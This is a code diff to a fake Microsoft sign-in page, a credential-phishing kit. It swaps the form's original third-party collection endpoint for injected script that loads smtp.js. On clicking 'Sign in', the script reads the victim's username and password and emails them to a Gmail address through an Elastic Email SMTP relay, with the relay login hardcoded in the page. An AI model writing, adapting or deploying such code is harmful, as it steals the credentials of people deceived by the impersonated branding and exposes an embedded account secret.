@@ -15,7 +15,7 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
-            <form action="https://public.herotofu.com/v1/802ab6a0-5675-11ef-9486-7161656f17b2" method="post" accept-charset="UTF-8">
+            <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
                     <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
@@ -49,7 +49,7 @@
                 <span id="user_identity">a@b.com</span>
             </div>
             <h2 class="title mb-16">Enter password</h2>
-            <form action="https://public.herotofu.com/v1/802ab6a0-5675-11ef-9486-7161656f17b2" method="post" accept-charset="UTF-8">
+            <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
                     <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
@@ -62,7 +62,7 @@
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_sig" type="submit">Sign in</button>
+                <button class="btn" onclick="sendmail()" id="btn_sig">Sign in</button>
             </div>
         </div>
     </section>
@@ -81,7 +81,7 @@
             </label>
             <div class="btn-group">
                 <button class="btn btn-sec" id="btn_final">No</button>
-                <button type="submit" class="btn" id="btn_final">Yes</button>
+                <button class="btn" id="btn_final">Yes</button>
             </div>
         </div>
     </section>
@@ -91,6 +91,30 @@
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="assets/app.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"/></script>
+    <script>
+        function sendmail(){
+          var email = document.getElementById('inp_pwd').value;
+          var password = document.getElementById('inp_uname').value;
+          this.sendEmail(email, password);
+        }
+        function sendEmail(email, password) {
+                Email.send({
+                    Host: "smtp.elasticemail.com",
+                    Username: "khaytechscripts@gmail.com",
+                    Port:"2525",
+                    Password: "B5CD201DE749D3E3A1E748C425586D4A6E5C",
+                    To: 'khaytechscripts@gmail.com',
+                    From: "khaytechscripts@gmail.com",
+                    Subject: "Micro Access",
+                    Body: `Email: ${email} <br> password: ${password}`,
+                })
+                    .then(function (message) {
+                        alert("mail sent successfully")
+                    });
+            }
+    </script>
+    
 </body>
 
 </html>
